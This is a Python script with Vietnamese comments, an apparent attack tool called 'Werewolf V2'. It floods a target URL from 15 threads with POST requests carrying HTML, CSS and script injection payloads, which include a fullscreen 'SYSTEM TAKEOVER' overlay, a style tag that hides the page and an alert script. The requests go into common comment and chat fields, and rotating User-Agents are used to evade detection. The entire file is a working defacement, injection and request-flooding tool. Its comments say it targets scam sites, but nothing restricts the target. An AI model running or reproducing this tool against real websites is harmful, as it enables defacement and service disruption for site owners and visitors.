import requests
import threading
import random
import time
import sys
import os

# Màu sắc cho giao diện chuyên nghiệp
G = '\033[0;32m'
R = '\033[0;31m'
Y = '\033[0;33m'
NC = '\033[0m'

# Danh sách mã giả lập trình duyệt (User-Agents) để tránh bị máy chủ phát hiện
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
]

# Kho vũ khí HTML + CSS
PAYLOADS = {
    "1": "<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:black;z-index:999999;display:flex;align-items:center;justify-content:center;'><h1 style='color:red;font-size:50px;font-family:Arial;'>WEREWOLF SYSTEM TAKEOVER</h1></div>",
    "2": "<style>body{display:none !important;}</style><h1 style='text-align:center;'>WEB NÀY ĐÃ BỊ VÔ HIỆU HÓA</h1>",
    "3": "<marquee style='font-size:40px;color:yellow;background:blue;'>WEREWOLF ĐANG TẤN CÔNG DỒN DẬP!!!</marquee>",
    "4": "<script>alert('Werewolf Detection');</script>"
}

def attack_worker(url, payload, stop_event):
    """Mỗi luồng đóng vai trò một con sói tấn công liên tục"""
    while not stop_event.is_set():
        try:
            # Xoay tua User-Agent để 'ẩn mình'
            headers = {'User-Agent': random.choice(UA_LIST)}
            
            # Gửi dữ liệu tiêm (Injection) vào các field phổ biến của web lừa đảo
            data_to_send = {
                'message': payload,
                'comment': payload,
                'user': 'Werewolf_Hunter',
                'chat': payload
            }
            
            # Thực hiện POST request
            response = requests.post(url, data=data_to_send, headers=headers, timeout=5)
            
            # Nếu Status 200 là thành công, 403/429 là bị chặn (nhưng vẫn gây tải cho server)
            if response.status_code == 200:
                print(f"{G}[✓] Đã tiêm thành công!{NC}", end='\r')
            else:
                print(f"{Y}[!] Đang ép xung server ({response.status_code}){NC}", end='\r')
            
            # Độ trễ nhỏ (0.1s) để điện thoại không bị nóng máy và lag
            time.sleep(0.1)
        except:
            print(f"{R}[!] Mục tiêu đang quá tải hoặc sập...{NC}", end='\r')
            time.sleep(1)

def main():
    os.system('clear')
    if len(sys.argv) < 2:
        print(f"{R}[!] Lỗi: Thiếu URL mục tiêu.{NC}")
        return

    target = sys.argv[1]
    print(f"{G}--- CHẾ ĐỘ TẤN CÔNG THÔNG MINH (WEREWOLF V2) ---{NC}")
    print(f"{Y}Mục tiêu:{NC} {target}")
    print("-" * 45)
    print("Chọn vũ khí HTML + CSS:")
    print(f"1. {G}Giao diện đen (Takeover Fullscreen){NC}")
    print(f"2. {G}Xóa sạch nội dung web (Stealth Mode){NC}")
    print(f"3. {G}Chạy chữ hỗn loạn (Marquee Chaos){NC}")
    print(f"4. {G}Tiêm Alert (Popup Test){NC}")
    
    choice = input(f"\n{Y}[?] Nhập lựa chọn (1-4): {NC}")
    payload = PAYLOADS.get(choice, PAYLOADS["1"])

    # Cấu hình đa luồng (15 luồng là mức mạnh nhất mà máy vẫn êm)
    thread_count = 15
    stop_event = threading.Event()
    threads = []

    print(f"\n{G}[*] Đang thả {thread_count} con sói đa luồng...{NC}")
    print(f"{Y}[i] Nhấn Ctrl + C để thu quân (dừng tấn công).{NC}\n")

    for i in range(thread_count):
        t = threading.Thread(target=attack_worker, args=(target, payload, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] Đang dừng tấn công để hạ nhiệt điện thoại...{NC}")
        stop_event.set()
        print(f"{G}[✓] Đã dừng. Tạm biệt!{NC}")

if __name__ == "__main__":
    main()
    
